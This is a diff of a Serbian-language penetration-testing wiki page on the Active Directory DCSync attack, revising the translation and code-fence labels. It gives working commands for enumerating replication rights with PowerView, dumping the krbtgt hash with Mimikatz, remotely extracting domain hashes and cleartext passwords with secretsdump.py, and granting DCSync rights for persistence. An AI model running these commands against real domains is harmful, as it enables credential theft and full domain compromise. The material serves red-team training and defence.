@@ -4,26 +4,26 @@
 
 ## DCSync
 
-Dozvola **DCSync** podrazumeva posedovanje ovih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.
+Dozvola **DCSync** podrazumeva da imate ove dozvole nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.
 
 **Važne napomene o DCSync:**
 
-- **DCSync napad simulira ponašanje Kontrolera domena i traži od drugih Kontrolera domena da repliciraju informacije** koristeći Protokol za daljinsku replikaciju direktorijuma (MS-DRSR). Pošto je MS-DRSR važno i neophodno funkcija Active Directory-a, ne može se isključiti ili onemogućiti.
+- **DCSync napad simulira ponašanje Kontrolera Domena i traži od drugih Kontrolera Domena da repliciraju informacije** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR validna i neophodna funkcija Active Directory-a, ne može se isključiti ili onemogućiti.
 - Po defaultu, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
 - Ako su lozinke bilo kojih naloga sačuvane sa reverzibilnom enkripcijom, dostupna je opcija u Mimikatz-u da vrati lozinku u čistom tekstu.
 
 ### Enumeration
 
 Proverite ko ima ove dozvole koristeći `powerview`:
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 ### Eksploatiši lokalno
-```powershell
+```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 ### Eksploatiši na daljinu
-```powershell
+```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
@@ -33,20 +33,20 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 
 - jedan sa **NTLM hash-ovima**
 - jedan sa **Kerberos ključevima**
-- jedan sa lozinkama u čistom tekstu iz NTDS za bilo koje naloge sa [**reverzibilnom enkripcijom**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) omogućenom. Možete dobiti korisnike sa reverzibilnom enkripcijom pomoću
+- jedan sa lozinkama u čistom tekstu iz NTDS za bilo koje naloge koji imaju [**reverzibilnu enkripciju**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) omogućenu. Možete dobiti korisnike sa reverzibilnom enkripcijom pomoću
 
-```powershell
+```bash
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 ```
 
-### Postojanost
+### Persistencija
 
 Ako ste administrator domena, možete dodeliti ova prava bilo kojem korisniku uz pomoć `powerview`:
-```powershell
+```bash
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
 Zatim, možete **proveriti da li je korisniku ispravno dodeljeno** 3 privilegije tražeći ih u izlazu (trebalo bi da možete da vidite imena privilegija unutar polja "ObjectType"):
-```powershell
+```bash
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 ### Ublažavanje
